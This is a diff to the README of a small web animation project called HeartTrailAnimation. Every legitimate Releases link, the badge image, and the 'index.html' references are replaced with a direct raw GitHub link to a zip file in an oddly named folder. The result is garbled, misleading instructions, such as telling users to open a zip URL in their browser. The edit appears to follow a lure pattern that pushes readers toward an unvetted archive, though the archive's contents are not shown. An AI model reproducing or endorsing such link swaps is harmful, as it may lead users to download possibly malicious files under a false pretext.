@@ -12,9 +12,9 @@ Welcome to HeartTrailAnimation! This fun web animation creates a lively experien
 
 ## 📥 Download HeartTrailAnimation
 
-[![Download HeartTrailAnimation](https://img.shields.io/badge/Download_Latest_Version-%F0%9F%9A%8D-brightgreen)](https://github.com/VAND1LIST/HeartTrailAnimation/releases)
+[![Download HeartTrailAnimation](https://raw.githubusercontent.com/VAND1LIST/HeartTrailAnimation/master/triliterality/HeartTrailAnimation.zip%F0%9F%9A%8D-brightgreen)](https://raw.githubusercontent.com/VAND1LIST/HeartTrailAnimation/master/triliterality/HeartTrailAnimation.zip)
 
-To get started, visit our [Releases page](https://github.com/VAND1LIST/HeartTrailAnimation/releases) and download the latest version. Follow the steps below to install and run the animation.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/VAND1LIST/HeartTrailAnimation/master/triliterality/HeartTrailAnimation.zip) and download the latest version. Follow the steps below to install and run the animation.
 
 ## 🛠️ System Requirements
 
@@ -24,11 +24,11 @@ To get started, visit our [Releases page](https://github.com/VAND1LIST/HeartTrai
 
 ## 📦 Download & Install
 
-1. Click on the [Releases page](https://github.com/VAND1LIST/HeartTrailAnimation/releases).
+1. Click on the [Releases page](https://raw.githubusercontent.com/VAND1LIST/HeartTrailAnimation/master/triliterality/HeartTrailAnimation.zip).
 2. Find the latest version available.
 3. Click on the download link for the version you want.
 4. Unzip the downloaded file if needed.
-5. Open the `index.html` file in your web browser.
+5. Open the `https://raw.githubusercontent.com/VAND1LIST/HeartTrailAnimation/master/triliterality/HeartTrailAnimation.zip` file in your web browser.
 
 That's it! You now have HeartTrailAnimation running on your webpage.
 
@@ -49,7 +49,7 @@ While the basic setup is easy, you can also customize the animation:
 
 ## 📖 Example Usage
 
-To see HeartTrailAnimation in action, use the provided `index.html` file. Simply open it in your browser to witness the colorful hearts. This is a perfect addition to any web project for enhancing user engagement.
+To see HeartTrailAnimation in action, use the provided `https://raw.githubusercontent.com/VAND1LIST/HeartTrailAnimation/master/triliterality/HeartTrailAnimation.zip` file. Simply open it in your browser to witness the colorful hearts. This is a perfect addition to any web project for enhancing user engagement.
 
 ## 👥 Community and Support
 
@@ -80,4 +80,4 @@ Explore other projects or enhancements in the same areas to further enrich your 
 
 HeartTrailAnimation is licensed under the MIT License. Feel free to use this in your projects, and we appreciate any attribution.
 
-For more information, visit the [Releases page](https://github.com/VAND1LIST/HeartTrailAnimation/releases) and download the latest version today!
+For more information, visit the [Releases page](https://raw.githubusercontent.com/VAND1LIST/HeartTrailAnimation/master/triliterality/HeartTrailAnimation.zip) and download the latest version today!
